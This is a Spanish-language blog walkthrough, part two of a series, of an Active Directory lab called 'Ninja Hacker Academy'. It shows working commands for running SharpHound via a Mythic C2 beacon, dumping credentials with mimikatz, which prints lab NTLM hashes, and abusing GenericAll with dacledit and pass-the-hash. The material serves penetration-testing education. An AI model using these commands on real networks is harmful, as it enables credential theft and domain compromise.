---
layout: single
title: Ninja Hacker Academy Parte 2
excerpt: "En esta segunda parte, recolectaremos la data de bloodhound, ejecutaremos mimikatz en el sistema comprometido para oobtener credenciales y haremos movimiento lateral a otro sistema en la red."
date: 2025-09-22
classes: wide
header:
  teaser: /assets/images/NHA/logo_NHA.jpeg
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Active Directory
---


<p align="center">
  <img src="/assets/images/NHA/logo_NHA.jpeg" alt="Logo NHA" style="max-width:60%; height:auto;">
</p>

# Introducción
En esta segunda parte, recolectaremos la data de bloodhound, ejecutaremos mimikatz en el sistema comprometido para oobtener credenciales y haremos movimiento lateral a otro sistema en la red.

Partimos del contexto en el que tenemos dos beacons del sistema sql, con la ip 192.168.56.21, uno con la cuenta NT AUTHORITY\NETWORK SERVICE, y otro con privilegios de SYSTEM.

Vamos a editar el fichero hosts de nuestra máquina atacante, para que pueda resolver los nombres de las máquinas del laboratorio. Para ello, netexec nos facilita la tarea, de esta forma:

```bash
nxc smb 192.168.56.0/24 --generate-hosts-file hosts.txt
```

![](/assets/images/NHA/hosts.png)

Una de las tareas más importantes a la hora de ejecutar un pentesting en un entorno de active directory, es obtener la data de bloodhound, para poder enumerar en condiciones todo el entorno. Para ello, es posible ejecutar en memoria SharpHouind.exe desde Mythic, que nos proporcionará lo que necesitamos.

Con register_assembly lo cargamos en Mythic, y con execute_assembly lo ejecutamos.

![](/assets/images/NHA/sharphound.png)

```bash
execute_assembly SharpHound.exe -c All,GPOLocalGroup
```
![](/assets/images/NHA/sharphound2.png)

Ahora es posible descargarlo para analizarlo desde bloodhound.

![](/assets/images/NHA/download_blood.png)

Además vamos también a ejecutar mimikatz desde mythic, para intentar obtener hashes que nos puedan servir para movernos lateralmente.

```bash
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"
```

![](/assets/images/NHA/mimi.png)

Y obtenemos el hash ntlm de la cuenta de máquina sql$

```
* Username : SQL$
	 * Domain   : ACADEMY
	 * NTLM     : 87301c6906621fb1b4973ec2b2f4d937
	 * SHA1     : f52af5354b64f68fb9deef15e3a37de252d017e9
	 * DPAPI    : f52af5354b64f68fb9deef15e3a37de2
```


Si nos vamos a bloodhound y buscamos la cuenta de máquina sql, vemos que tiene GenericAll sobre un contenedor llamado computers, y bloodhound nos sugiere utilizar dacledit con el parámetro -inheritance, para que se hereden los permisos a todos los objetos que hayan dentro del contenedor.

![](/assets/images/NHA/bloodhound3.png)

```bash
dacledit.py -action "write" -principal SQL$ -target-dn "CN=COMPUTERS,DC=ACADEMY,DC=NINJA,DC=LAN" "academy.ninja.lan"/"SQL$" -hashes :87301c6906621fb1b4973ec2b2f4d937 -inheritance
[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250926-194525.bak
[*] DACL modified successfully!
```

![](/assets/images/NHA/dacledit.png)

Ahora, si actualizamos la data de bloodhound, volviendo a ejecutar el comando de antes, descargando el nuevo archivo y subiéndolo a bloodhound vemos que tenemos GenericAll también sobre la máquina web$. Y además nos sugiere que utilicemos la técnica RBCD (Resource-Based Constrained Delegation).

![](/assets/images/NHA/bloodhound4.png)



